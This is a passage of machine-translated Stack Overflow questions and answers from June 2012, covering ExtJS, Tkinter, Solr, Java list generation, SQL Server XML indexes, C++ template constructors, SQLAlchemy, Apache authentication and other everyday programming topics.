* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-15T14:14:42.063

如果你使用它们，那么你必须包括它们。但是您可以在项目属性中将它们关闭。

但是，使用它们的*推荐方法是**从命令行*“强制包含”PCH ，以便文件*本身*不包含 PCH。这样源文件可以与其他系统兼容。

# extjs4.1 - ExtJS - 将 Treepanel 节点向上/向下移动代码

> ID：11052221
> 
> 赞同：0
> 
> 时间：2012-06-15T14:06:08.910
> 
> 标签：extjs4.1, treepanel

在 TreeList 上移动选定节点的最佳方法是什么。TreeList 将是一个没有叶节点的嵌套列表。

我尝试创建所选节点的对象并将其附加到 parentNode

selectedNode[0].parentNode.parentNode.appendChild(newNode) 和 selectedNode[0].parentNode.parentNode.insertBefore(newNode, selectedNode[0].nextSibling);

但总是出现“internalId”未定义错误，我使用的是 4.1 版本的 ext。

在以前的版本中，我见过 var newNode = Ext.create('Ext.tree.TreeNode', {..});

有没有其他选择。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:11:53.103

这就是我在 4.1 中添加新节点的方式：

```
// If no selection on the tree, the root node is the one we're adding to.
if ( ! this.selection )
    this.selection = this.panel.getRootNode();

// Create a new node record
var iNewRecord = this.selection.createNode({
    leaf:   false,
    loaded: true,        
}); 
```

# python - 编辑网格中特殊位置的条目

> ID：11052223
> 
> 赞同：1
> 
> 时间：2012-06-15T14:06:14.407
> 
> 标签：python, dictionary, grid, tkinter

我有一个通过 grid() 创建条目的函数，如下所示：（用函数替换 while-loop，这应该只是向您展示它稍后的样子）

```
from Tkinter import * 

root = Tk()

index=0

while index < 10:

     col0 = Text(root,width=20, height=1, bg='white')
     col0.grid(row=index,column=0)
     col0.insert('0.0',"name")
     col1 = Text(root,width=20, height=1, bg='white')
     col1.grid(row=index,column=1)
     col1.insert('0.0',"attribute #1")
     col2 = Text(root,width=20, height=1, bg='white')
     col2.grid(row=index,column=2)
     col2.insert('0.0',"attribute #2")
     col3 = Text(root,width=20, height=1, bg='white')
     col3.grid(row=index,column=3)
     col3.insert('0.0',"counter")
     index+=1

root.mainloop() 
```

所以在特殊事件中调用该函数并创建一个新条目（新行）。但如果这个事件已经有一个条目，我只想增加计数器。

事件名称及其条目行（索引）保存在字典中，所以我确实有行和列，但我现在如何实际访问 col3？

我计划通过 col3.get() 获取计数器，但它在每一行中都称为 col3，那么我该如何指定呢？

是否可以将 col0、col1、col2 等放入一种结构（如字典）中，因此通过 col0[name].insert()... 访问它们（名称是唯一的）？我试过了，但没有成功（这并不意味着我希望它不可能，我对 python 还很陌生）

有人对我的问题有任何建议或解决方案吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:23:31.983

你的字典想法很好。我在这里提出了一个简单的实现......（类是在函数调用之间保持数据持久性的最佳方式。）

在此示例中，您的 Text 小部件可以通过`app.ObjGrid[(row,col)]`或通过方法访问，`self.ObjGrid[(row,col)]`如果您从方法中进行访问。

```
import Tkinter as tk

class TextGrid(tk.Frame):
    def __init__(self,master):
        tk.Frame.__init__(self,master)
        self.ObjGrid={}
        self.index=1
        for i in xrange(10):
            self.addRow()

    def addRow(self,index=None):
        """
        add a row of widgets at row=<index>.  If index is omitted, add the next row
        If index is on the grid already, prints "Increment counter?" since I don't
        know what you mean by that
        """

        if(index is None):
           index=self.index+1
           self.index+=1
        if (index,0) in self.ObjGrid:
            print "Increment counter?"  #probably replace this code...
            return

        self.ObjGrid[(index,0)] = col0 = tk.Text(self,width=20, height=1, bg='white')
        col0.grid(row=index,column=0)
        col0.insert('0.0',"name")
        self.ObjGrid[(index,1)] = col1 = tk.Text(self,width=20, height=1, bg='white')
        col1.grid(row=index,column=1)
        col1.insert('0.0',"attribute #1")
        self.ObjGrid[(index,2)] = col2 = tk.Text(self,width=20, height=1, bg='white')
        col2.grid(row=index,column=2)
        col2.insert('0.0',"attribute #2")
        self.ObjGrid[(index,3)] = col3 = tk.Text(self,width=20, height=1, bg='white')
        col3.grid(row=index,column=3)
        col3.insert('0.0',"counter")

if __name__ == "__main__":
    root=tk.Tk()
    app=TextGrid(root)
    app.grid(row=0,column=0)
    app.addRow(3) #Shouldn't do anything
    app.addRow() #Should add another row to the end.
    print(type(app.ObjGrid[(2,3)])) #tkinter text widget.
    root.mainloop() 
```

作为关于风格的说明......

```
from XXX import * 
```

通常不受欢迎。

```
import XXX as short_name_that_is_easy_to_remember 
```

一般是首选。此外，在 Tkinter 中做事时，我发现从课堂开始总是最容易的。构建一个*小部件*。将小部件更改为应用程序是微不足道的，但将应用程序更改为小部件几乎是不可能的。如上所示，构建小部件的最简单方法是从该框架继承`Frame`然后将其他小部件打包到该框架上。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:25:03.147

您需要保存对您创建的所有 Text 小部件的引用：

```
colHeaders = ["name", "attribute #1", "attribute #2", "counter"]
myTextWidgets = []
for index in range(10):
    subList = []
    for i, header in enumerate(colHeaders):
        text = Text(root,width=20, height=1, bg='white')
        text.grid(row=index,column=i)
        text.insert('0.0',header)
        subList.append(text)
    myTextWidgets.append(subList) 
```

这将允许您通过它的行/列访问每个小部件：

```
myTextWidgets[0][1].config(bg="purple") 
```

您可以像这样轻松地将新行附加到此结构中：

```
subList = []
for i, header in enumerate(colHeaders):
    text = Text(root,width=20, height=1, bg='white')
    text.grid(row=len(myTextWidgets),column=i)
    text.insert('0.0', header)
    subList.append(text)
myTextWidgets.append(subList) 
```

使用这种结构，唯一的不是*名称*，而是每个单元格的*位置*。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:25:59.417

这不仅是可能的，而且我会说在这种情况下更可取。这是一种简单的方法：

```
attr_names = ['name', 'attribute #1', 'attribute #2', 'counter']
def make_text_field(row, col, attr_name):
    text = Text(root, width=20, height=1, bg='white')
    text.grid(row=row, column=col)
    text.insert('0.0', attr_name)

text_fields = {}
for row, col in itertools.product(xrange(10), xrange(4)):
    text_fields[row, col] = make_text_field(row, col, attr_names[col]) 
```

这会将每个字段单独存储在 中`text_fields`，以`(row, col)`元组作为键。您还可以创建列表列表；因为您想访问整个列，您可能更喜欢这样。`product`您可以如上所述预先分配列表并使用，但为简单起见，这是另一种方法：

```
list_of_cols = list()
for col in xrange(4):
    col = list()
    list_of_cols.append(col)
    for row in xrange(10):
        col.append(make_text_field(row, col, attr_names[col])) 
```

# search - 在 solr 中可以创建具有多个值的构面吗？请看详情

> ID：11052224
> 
> 赞同：0
> 
> 时间：2012-06-15T14:06:16.943
> 
> 标签：search, solr

我有一个名为 articleType 的字段。一篇文章可以有一种或多种类型。现在我想创建一个构面，例如 type_facet，它将具有文章的“类型”列的所有值。IE 它将从单个列中获取多个值，任何想法怎么可能？

我知道 facet 可以是多值的，但这仅在 facet 从不同字段复制数据时才有效。

下面是方面的配置。

```
<field name="type" type="string" indexed="true" stored="true" omitNorms="true"/>
<field name="type_facet" type="string" indexed="true" stored="true" omitNorms="true" multiValued="true"/> 
```

然后我将此类型值复制到构面。

```
<copyField source="type" dest="type_facet"/> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T20:20:32.077

这应该是开箱即用的。将 articleType 字段更改为使用 WhitespaceTokenizerFactory 标记器作为索引的类型（`textgen`在默认的 Solr 安装中可能称为类似或类似的东西）。然后将所有适用的文章类型用空格分隔在文章文档的该字段中。然后，当您按该字段分面时，它将返回所有此类值。如果您的文章类型是多字的，那么您将不得不在这些字段上使用多值字段和构面。同样，它应该可以正常工作。

# java - 获取具有子集的列表的“相邻”值的算法

> ID：11052229
> 
> 赞同：0
> 
> 时间：2012-06-15T14:06:24.533
> 
> 标签：java, algorithm, list, subset

我有一个这样的文本文件：

```
A
B
C 
```

每个元素都有一个像这样的子集：

```
A = { a1, a2, a3 }
B = { b1, b2 }
C = { c1, c2, c3 } 
```

我想生成这个：

```
    a1, b1, c1
     a2 , b1, c1
     a3 , b1, c1
    a1, b2 , c1
    a1, b1, c2 
    a1, b1, c3

```

我不知道文本文件中元素的数量（例如，可能是：A、B、C、D、E），并且子集的大小可能会有所不同。

我只能认为它是一个具有 2 个索引的递归函数，可能是“数组中的位置”和“数组的索引”，但我真的不知道如何实现所有这些。

我什至尝试调整一个使用相同输入进行笛卡尔积的函数，但我完全失败了。**我不需要生成笛卡尔积**。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-15T14:33:50.863

构建“基本列表”，它由每个列表的第一个元素组成。然后遍历所有列表的所有元素。对于每个这样的元素，使用该元素在适当位置更新基本列表，并将此更新的列表添加到列表的运行计数中。

我在下面包含了一个示例实现。

```
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class AdjacentListGenerator {
    public static <T> List<List<T>> generateAdjacentLists(List<List<T>> lists) {
        List<List<T>> result = new ArrayList<List<T>>();
        List<T> baseList = new ArrayList<T>();

        // Generate the base list, which is comprised of all the first elements
        for (List<T> list : lists) {
            baseList.add(list.get(0));
        }
        result.add(baseList);

        // Loop over each list, and for each element beyond the first, make a
        // copy of the base list, update that element in place, and add it to
        // our result
        for (int list_i = 0; list_i < lists.size(); list_i++) {
            List<T> list = lists.get(list_i);
            for (int listElement_i = 1; listElement_i < list.size(); listElement_i++) {
                List<T> updatedList = new ArrayList<T>(baseList);
                updatedList.set(list_i, list.get(listElement_i));
                result.add(updatedList);
            }
        }

        return result;
    }

    public static void main(String... args) {
        List<String> a = Arrays.asList(new String[] { "a1", "a2", "a3" });
        List<String> b = Arrays.asList(new String[] { "b1", "b2" });
        List<String> c = Arrays.asList(new String[] { "c1", "c2", "c3" });
        List<List<String>> lists = new ArrayList<List<String>>();
        lists.add(a);
        lists.add(b);
        lists.add(c);
        for (List<String> list : AdjacentListGenerator
                .generateAdjacentLists(lists)) {
            System.out.println(list);
        }
    }
} 
```

输出

```
[a1, b1, c1]
[a2, b1, c1]
[a3, b1, c1]
[a1, b2, c1]
[a1, b1, c2]
[a1, b1, c3] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-15T14:26:07.097

```
List<List<Integer>> myInput = ...

for(int i=0; i<myInput.size(); i++){
     for (int j=0; j<myInput.get(i).size(); j++){
        if (j == 0 && i > 0){
           continue;
        }
        List<Integer> result = new ArrayList<Integer>(myInput.size());
        for(int k=0; k<myInput.size(); k++){
            if (k == i){
               result.add(myInput.get(k).get(j));
            }else{
               result.add(myInput.get(k).get(0));
            }
        }
        System.out.println(result);
     }
} 
```

遍历所有列表，其中索引是要迭代的列表。

找到要迭代的内部 List 的大小并循环多次。

遍历列表总是获取第一个元素，除非列表是被索引的列表，在这种情况下从迭代列表中获取下一个值。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-15T18:56:42.617

每个人都在使用容器，所以我将尝试仅使用数组来解决它。

在这个算法中，我只打印第一行，然后我专注于用其余子集的第一个元素围绕子集的下一个元素

```
String[] lines = { "a1, a2, a3", "b1, b2", "c1, c2, c3" };

String[][] array = new String[lines.length][];
for (int i = 0; i < lines.length; i++)
    array[i] = lines[i].replaceAll(" +", "").split(",");

//lets type 1st row to ignore it in rest algoritm
System.out.print(array[0][0]);
for (int i = 1; i < array.length; i++)
    System.out.print(", " + array[i][0]);
System.out.println();

//in rest of algorithm we must surround each element by 
//1st element or rest rows, so lets iterate over each row
for (int row = 0; row < array.length; row++) 
    //and surround its elements
    for (int col = 1; col < array[row].length; col++) {
        //left surround
        int i=0;
        for (; i<row; i++)
            System.out.print(array[i][0]+", ");
        //
        System.out.print(array[row][col]);
        //right surround
        for (i=i+1; i<array.length; i++)
            System.out.print(", "+array[i][0]);
        System.out.println();
    } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-15T15:17:45.397

我的回答假设您已经对数据集进行了排序并且它们的顺序正确。

```
public class SubsetPrinter
{
  private static final String DELIMITER = ", ";
  private static final String NEWLINE = System.getProperty("line.separator");

  public static String printSubsets(Map<String, List<String>> elements)
  {
    List<String> lines = new ArrayList<String>();
    for (Map.Entry<String, List<String>> entry : elements.entrySet())
    {
      for (String sub : entry.getValue())
      {
        String line = getLine(elements, entry.getKey(), sub);
        if (!lines.contains(line))
        {
          lines.add(line);
        }
      }
    }
    return asString(lines);
  }

  private static String getLine(Map<String, List<String>> elements, String element, String sub)
  {
    StringBuilder line = null;
    for (Map.Entry<String, List<String>> entry : elements.entrySet())
    {
      if (line == null)
      {
        line = new StringBuilder();
      }
      else
      {
        line.append(DELIMITER);
      }
      if (entry.getKey().equals(element))
      {
        line.append(sub);
      }
      else
      {
        line.append(entry.getValue().get(0)); // appends the first 
      }
    }
    return line.toString();
  }

  private static String asString(List<String> lines)
  {
    StringBuilder sb = null;
    for (String line : lines)
    {
      if (sb == null)
      {
        sb = new StringBuilder();
      }
      else
      {
        sb.append(NEWLINE);
      }
      sb.append(line);
    }
    return sb.toString();
  }
} 
```

测试是：

```
private Map<String, List<String>> getDataSet1()
{
  Map<String, List<String>> map = new HashMap<String, List<String>>();
  List<String> subsetA = Arrays.asList( new String[] { "a1", "a2", "a3" } );
  List<String> subsetB = Arrays.asList( new String[] { "b1", "b2" } );
  List<String> subsetC = Arrays.asList( new String[] { "c1", "c2", "c3" } );
  map.put("A", subsetA);
  map.put("B", subsetB);
  map.put("C", subsetC);
  return map;
}

@Test
public void testPrintSubsets()
{
  Map<String, List<String>> elements = getDataSet1();
  String output = SubsetPrinter.printSubsets(elements);
  System.out.println(output);
} 
```

输出：

```
a1, b1, c1
a2, b1, c1
a3, b1, c1
a1, b2, c1
a1, b1, c2
a1, b1, c3 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-15T20:01:30.340

正式化您的问题：

这可以映射到多阶段图。刚刚在[网上搜索了多阶段图的图解说明：](http://www.gateguru.org/algorithms/multistage_graphs.pdf) 您要做的是打印从超级源“S”到超级汇“T”的所有路径。您可能想阅读相同的内容。如果您进一步感兴趣，这也与[网络流问题有关。](http://community.topcoder.com/tc?module=Static&d1=tutorials&d2=maxFlow)

# sql-server - XML 索引使查询变慢 - 有什么建议吗？（SQL服务器）

> ID：11052233
> 
> 赞同：1
> 
> 时间：2012-06-15T14:06:38.743
> 
> 标签：sql-server, tsql

我们有一个非常不规则的、超大的 XML 字段和表。一个 XSD，但内部有很多变化。

我们尝试添加主要和次要（全部独立）三个索引，我们得到的只是一个更大的表，查询运行速度稍慢。

看起来我们不能轻松地键入我们的 XML，我读过它有很大帮助。

示例查询。非常感谢任何帮助。

```
where xml_info.value ('(//ABC/ABCFreeTx) [1]','varchar (80)') <> 'SUCCESSFUL' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:15:00.567

尽管 SQL Server 为 XML 结构的数据提供了一些支持，但它**不是**一种推荐的存储数据的方式——它的本质就是不适合 RDBM。

如果您需要搜索归结为 XML 的数据，我建议在插入/更新时创建一个触发器以获取可搜索数据并将其存储在常规列中（以便它们可以被正确索引），并将 XML 数据保留在文本字段（即`VARCHAR(MAX)`）。

# android - Android Fragments 选项卡的自定义回栈

> ID：11052237
> 
> 赞同：3
> 
> 时间：2012-06-15T14:06:56.610
> 
> 标签：android, android-fragments, android-tabs

如何为每个选项卡创建自定义回栈行为，例如在 FragmentTabs 示例中？父 Activity 的 FragmentManager 在管理单个堆栈方面似乎非常严格，但我在 SO 中看到评论指出这种行为在浏览器等应用程序中是可能的，其中每个选项卡/窗口都有自己的后键管理。我试图避免 ActivityGroup / TabActivity 路线。

# c# - 如何使用 Fileupload 读取文件的内容

> ID：11052238
> 
> 赞同：8
> 
> 时间：2012-06-15T14:07:09.257
> 
> 标签：c#, asp.net

是否可以使用 Fileupload 读取文件的内容。

例如，我想将 XML 文件保存在 Database 中，用户使用 Fileupload 搜索文件，然后单击按钮将文件的内容保存在 Database 中。

我试过这个但不起作用

```
string s=Fileuploder1.Filecontent.tostring(); 
```

但没有成功，你有什么想法吗？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-06-14T20:38:00.920

```
string inputContent;
using (StreamReader inputStreamReader = new StreamReader(InputFileUpload.PostedFile.InputStream))
{
    inputContent = inputStreamReader.ReadToEnd();
} 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2016-05-25T18:38:42.783

我们不能直接读取文件，而是应该将其保存在项目位置。使用我们可以在流阅读器的帮助下读取的项目文件路径。

```
var filePath = Path.Combine(Server.MapPath("~/Document"), fileName);
                file.SaveAs(filePath);

                if (!string.IsNullOrEmpty(filePath))
                {
                    using (StreamReader sr = new StreamReader(Path.Combine(Server.MapPath("~/Document"), fileName)))
                    {
                        while (sr.Peek() >= 0)
                        {
                            strbuild.AppendFormat(sr.ReadLine());
                        }
                    }

                } 
```

更多详情： http: [//www.infinetsoft.com/Post/How-to-read-text-file-using-fileupload-control-in-asp-net-MVC/1245](http://www.infinetsoft.com/Post/How-to-read-text-file-using-fileupload-control-in-asp-net-MVC/1245)

# scala - Scala中基于角色的编程框架/面向复合的编程框架

> ID：11052239
> 
> 赞同：3
> 
> 时间：2012-06-15T14:07:16.683
> 
> 标签：scala, dependency-injection, domain-driven-design, aop, cop

我可以从哪里获得 scala 中的面向复合编程框架——Qi4j 或类似的？

供参考：[www.qi4j.org](http://www.qi4j.org)

什么是 Qi4j™？- [简介取自www.qi4j.org]

简短的回答是 Qi4j™ 是一个以领域为中心的应用程序开发框架，包括从 AOP、DI 和 DDD 演变而来的概念。

Qi4j™ 是面向复合编程的实现，使用标准的 Java 5 平台，不使用任何预处理器或新的语言元素。您在 Java 5 中所知道的一切仍然适用，并且您可以利用您的经验和工具包来提高今天的面向复合编程的生产力。

此外，Qi4j™ 支持 Java 平台上的面向复合编程，包括作为主要语言的 Java 和 Scala，以及作为桥接语言在 JVM 上运行的许多语言。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T07:40:49.960

看看[这个答案](https://stackoverflow.com/questions/11054299/can-we-assign-change-traits-to-the-scala-class-during-runtime-how-any-sampl)，看看为什么你不能在运行时改变特征。

为了动态改变（或选择）行为：也许你看看[类型类](http://marakana.com/s/scala_typeclasses,1117/index.html)或隐式转换。

问候，扬

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T12:46:15.587

Qi4j 2.0（正在开发中）添加了强大的 Scala 支持，我们正在努力使 Scala Traits 可用作 Qi4j 混合和关注点（AOP“围绕建议”等价物）。Scala trait 编译为静态方法，该方法将拥有类的代理实例作为第一个参数（C 中的经典 C++ 表示）。Qi4j 将能够将 Trait 连接为 Mixin（即方法可以在 Composite 的公共接口中公开）并绑定到底层 StateHolder 以供 Trait 使用复合，因此似乎 Trait 将具有状态。 ..

FTR; Qi4j 2.0 还最大限度地减少了类型占用空间，允许使用与 Qi4j 无关的类型比以前更多。

# c++ - C++ 单构造函数模板特化

> ID：11052241
> 
> 赞同：1
> 
> 时间：2012-06-15T14:07:22.410
> 
> 标签：c++, templates, constructor, template-specialization

对不起，如果这是一个骗局。有许多类似的问题，但似乎没有一个真正解决这个问题。他们都有点不同。

所以我想要实现：考虑一个模板类`X<T>`。现在，我希望为该模板的特定实例存在一个额外的构造函数，比如说指针`X<T*>`。我不想创建一个完整的模板规范`X<T*>`，因为`X<T*>`它应该和通常的模板完全一样（而且那个模板很大，所以复制粘贴会是一种代码重复的味道），只是它有一个额外的构造函数。我也不想`X<T*>`继承自，`X<T>`因为我不想在这两者之间建立子类型关系。这可能吗？我试过这样：

```
template<T> class X{};

template<T> X<T*>::X(int i){...} 
```

但它不编译。这有可能吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T14:22:06.890

您可以使用[SFINAE](http://en.wikipedia.org/wiki/Substitution_failure_is_not_an_error)执行以下操作：

```
#include <iostream>
#include <type_traits>

template<class T> class X{
public:
    X(int i) {
        init();
    }
private:
    template<class U = T>
    typename std::enable_if<std::is_pointer<U>::value>::type init() {
        std::cout << "It's a pointer!\n";
    }

    template<class U = T>
    typename std::enable_if<!std::is_pointer<U>::value>::type init() {
        std::cout << "It's not a pointer!\n";
    }
};

int main() {
    X<int> a(1);
    X<int*> b(2);
} 
```

哪个输出：

```
It's not a pointer!
It's a pointer! 
```

你没有重载构造函数，但你正在实现你想要的。

请注意，您需要 C++11 才能使用此代码。

**编辑**：好的，这段代码正是你想要的：

```
#include <iostream>
#include <type_traits>

template<class T> class X{
public:
    template<class U = T, class enabler = typename std::enable_if<std::is_pointer<U>::value, T>::type>
    X(int i) {
        std::cout << "It's a pointer!\n";
    }

    template<class U = T, class enabler = typename std::enable_if<!std::is_pointer<U>::value, T*>::type>
    X() {
        std::cout << "It's not a pointer!\n";
    }
};

int main() {
    X<int> a;
    X<int*> b(2);
} 
```

仍然输出与以前相同。请注意，这不是一个很好的设计。根据您的模板参数有一些构造函数很奇怪。这段代码虽然解决了你的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T15:17:14.117

这是一个使用 boost 但不需要 C++11 的解决方案。在任何一种情况下，`X`都有一个带有单个参数的构造函数。当`T`是一个指针时，它期望的参数是一个`int`. 当`T`不是指针时，参数是调用者无法访问的类型。

```
#include <boost/type_traits.hpp>

template < typename T >
class X
{
private:
  // Declare a private type that will be used to prevent a single-argument 
  // constructor from being callable when T is not a pointer.
  struct T_must_be_a_pointer;
public:
  // Branch at compile-time based on T:
  // - If T is a pointer, then declare the X( int ) constructor.
  // - If T is not a pointer, then declare X( T_must_be_a_pointer ) constructor.
  explicit X( typename boost::mpl::if_< boost::is_pointer< T >,
                                        int,
                                        T_must_be_a_pointer >::type i )
  {}
};

int main() {
    X<int> a();
    // Next line will fail to compile:
    // X<int> b(1);
    X<int*> c(2);
    return 0;
} 
```

# sql - linq2sql 对结果进行分组

> ID：11052242
> 
> 赞同：0
> 
> 时间：2012-06-15T14:07:25.820
> 
> 标签：sql, linq, linq-to-sql

我的 sql 存储过程返回以下输出。

```
type_id description
------- -----------

1        Name details
3       FirstName
3       SurName
1      Address details
3      firstLine
3      LastLine
1      Employment details
2      occupation
3      salary 
```

type_id of 1 是父级，它的子级显示在下面。（直到我读到另一个父级）

我正在使用 Linq2Sql，我喜欢将其转换为 Dictionary< string ,List < string >>

例如

```
Name details  
  firstName  
  SurName  
Address details   
  firstLine  
  LastLine  
Employment details  
   occupation  
   salary 
```

可以在 linq 中使用吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T18:04:02.767

没有办法将“接下来的几个”记录作为孩子来处理，不。你必须通过他们建立你`Dictionary`的老式方式。

# sqlalchemy - sqlalchemy - 基于子级的过滤

> ID：11052246
> 
> 赞同：0
> 
> 时间：2012-06-15T14:07:41.077
> 
> 标签：sqlalchemy

我有三个类：PurchaseOrder、PurchaseOrderLine、Item

PurchaseOrder 子项是与Item 相关的PurchaseOrderLine。

```
pos = DBSession.query(m_po.PO).filter(or_(
            m_po.PO.number == query,
            m_po.POLine.item.code == query
        )).join(m_po.POLine).join(m_im.Item) 
```

给我 ...

```
AttributeError: Neither 'InstrumentedAttribute' object nor 'Comparator' object has an attribute 'code' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-17T21:44:40.163

假设：

```
m_po = PurchaseOrder
m_pol = PurchaseOrderLine
m_it = Item 
```

并且这些关系是在它们之间定义的，您应该能够通过以下方式实现这一点（未经测试）：

```
pos = (DBSession.query(m_po.PO).
    join(m_pol, m_po.POLine).
    join(m_it, m_pol.Items).
    filter(or_(
        m_po.PO.number == query,
        m_it.code == query,
    )) 
```

*注意：我有点困惑`m_im`你的代码代表*什么。

# python - 如何在 Python 中完成启用/禁用 TkInter 列表框

> ID：11052251
> 
> 赞同：1
> 
> 时间：2012-06-15T14:07:56.687
> 
> 标签：python, listbox, tkinter

我怎样才能简单地禁用 TkInter 列表框？这似乎是一件很简单的事情，而且可能确实如此。在下面的简单示例中，我有一个按钮，它应该将列表框的状态从完全可选择切换到灰色和不可选择。

```
#!/usr/bin/python

from Tkinter import *

class MyDialog:
    def __init__(self, rootWin):
        self.rootWin_ = rootWin
        self.frame_ = Frame( self.rootWin_, borderwidth=10 )
        self.frame_.grid(row=0, column=0)
        self.listBox_ = Listbox( self.frame_, height=4, width=30, selectbackground='#000000' )
        self.listBox_.grid(row=0, column=0)
        self.lbEnabled_ = 1
        for item in [ 'Red', 'Orange', 'Yellow', 'Green', 'Blue', 'Indigo', 'Violet' ]:
            self.listBox_.insert(END, item)
        self.button_ = Button( self.frame_, text='Disable', command=self.onEnableDisable)
        self.button_.grid(row=1, column=0)

    def go(self):
        self.rootWin_.mainloop()

    def onEnableDisable(self):
        if self.lbEnabled_ == 1:
            self.button_.config( text='Enable' )
            # TODO enable the list box
            self.lbEnabled_ = 0
        else:
            self.button_.config( text='Disable' )
            # TODO disable the list box
            self.lbEnabled_ = 1

def main():
    myDlg = MyDialog(Tk())
    myDlg.go()

if __name__ == '__main__':
    main() 
```

我尝试了一些事情，包括改变状态：

```
self.listBox_.config( state = DISABLED ) 
```

我发现的参考文档建议您可以使用 state 属性进行设置：

> **state** 默认情况下，列表框处于 NORMAL 状态。要使列表框对鼠标事件不响应，请将此选项设置为 DISABLED。

但是，如果我尝试这个，我得到的只是：

```
Exception in Tkinter callback
Traceback (most recent call last):
  File "/usr/lib/python2.4/lib-tk/Tkinter.py", line 1345, in __call__
    return self.func(*args)
  File "./example.py", line 24, in onEnableDisable
    self.listBox_.config( state = DISABLED )
  File "/usr/lib/python2.4/lib-tk/Tkinter.py", line 1139, in configure
    return self._configure('configure', cnf, kw)
  File "/usr/lib/python2.4/lib-tk/Tkinter.py", line 1130, in _configure
    self.tk.call(_flatten((self._w, cmd)) + self._options(cnf))
TclError: unknown option "-state" 
```

如您所见，我使用的是相当旧的python 版本（2.4），它可能无济于事，但我无法控制。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:47:53.063

您提出的代码对我有用（python 2.6，OS-X）。它实际上看起来像是`Tkinter`从回溯中做正确的事情。也许您也在使用旧版本，`Tcl/Tk`它也可能导致您看到的问题。如果您无法控制python版本，您是否可以控制Tk版本？

# jquery - 使用 jquery 在小屏幕中显示 html 数据

> ID：11052252
> 
> 赞同：0
> 
> 时间：2012-06-15T14:07:57.307
> 
> 标签：jquery, html

我真的不知道如何准确解释我需要什么功能，但我举个例子。如果您尝试在此论坛中提出问题，则会显示已提出的问题。当您将鼠标悬停在它们上时，它会显示她的标题已被鼠标悬停的问题的内容。我想知道什么 html 代码或 Jquery 函数可以做到这一点。非常感谢你 ！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:11:04.210

```
<a href="#" title="I am link">Link</a> 
```

演示：http: [//jsfiddle.net/98xAL/](http://jsfiddle.net/98xAL/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:15:35.027

我个人非常喜欢[Coda Bubble](http://jqueryfordesigners.com/demo/coda-bubble.html)，教程在[这里](http://jqueryfordesigners.com/coda-popup-bubbles/)，在视频中。很容易实现并且有一个很好的设计。

# apache - 专用域的 Apache 基本身份验证

> ID：11052259
> 
> 赞同：0
> 
> 时间：2012-06-15T14:08:08.743
> 
> 标签：apache, basic-authentication, vhosts

我有两个域别名为同一个 Apache vhost，因此针对同一个文档根目录。安装在该文档根目录中的 CMS 会根据用于访问它的域对完全不同的网站做出反应。

我现在需要实现一个基本身份验证（在 vhost config 或 .htaccess 中），它只保护两个网站中的一个。因此，通过一个域的访问必须受到保护，而另一个域则保持完全可访问。

我的问题是我没有找到任何 Apache 块指令根据用于访问的域或服务器环境变量（如 HTTPHOST）触发：

*   <Directory> 和 <Files> 不合适，因为两个域的目标目录相同。
*   <Location> 只查看路径而不查看域。

# c++ - 如何正确使用 _vsnprintf_r()？

> ID：11052261
> 
> 赞同：0
> 
> 时间：2012-06-15T14:08:13.000
> 
> 标签：c++, c, windows, cygwin, reentrancy

我正在尝试学习有关重入呼叫的知识，并且正在尝试使用`_vsnprintf_r()`. 第一个参数似乎是 some `struct _reent *`。在 Cygwin 上，似乎我可以像这样使用它：`_vsnprintf_r (_REENT, /* rest of the arguments here */)`. 这个对吗？即使在 Cygwin 之外，这是否正确？似乎确实缺乏这方面的文档。我的 Google 和 Bing 搜索结果并不理想。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:23:14.527

`_vsnprintf_r`不是标准功能。它由 cygwin 开发团队创建供内部使用。

由`_vsnprintf_r`常规调用`vsnprintf`，因此我会坚持`C`在 cygwin 上使用此调用的常规版本。cygwin 不保证`_vsnprintf_r`无论如何它是可重入的，特别是如果您找不到任何有关它的文档。

由于 cygwin 使用动态加载的库，该库在与其链接的所有进程之间共享状态，因此它使用`_<xxx>_r`调用的版本为每个进程提供其自己的状态实例，这通常是标准 UNIX 系统上的默认值。由于 cygwin 内部使用了这些函数，您可能会发现[cygwin-developers 邮件列表](http://cygwin.com/ml/cygwin-developers/)是解决您问题的更好资源。

这与 POSIX 定义的可重入函数（如`gmtime_r`）形成对比。这些返回指向库中静态内存的指针的不可重入版本，因此创建了可重入版本以允许函数使用调用者传入的内存。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-15T14:45:53.527

您可能不想通过重入调用“打印”任何内容，因为您不知道什么顺序或什么时候会“打印”。

一般来说，要编写可重入函数，请将所有内容传递给函数（无静态变量）。本地（堆栈）变量没问题 AFAIK。

打印是信号量（或其他一些锁定机制）的“经典”问题。否则，

你好世界

变成

赫洛洛德

或者充其量

地狱世界

# cordova - PhoneGap 移动应用程序

> ID：11052264
> 
> 赞同：0
> 
> 时间：2012-06-15T14:08:26.330
> 
> 标签：cordova

我刚刚找到PhoneGap，我想将它用于移动应用程序，是否有用于在PhoneGap 中开发的IDE？

先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
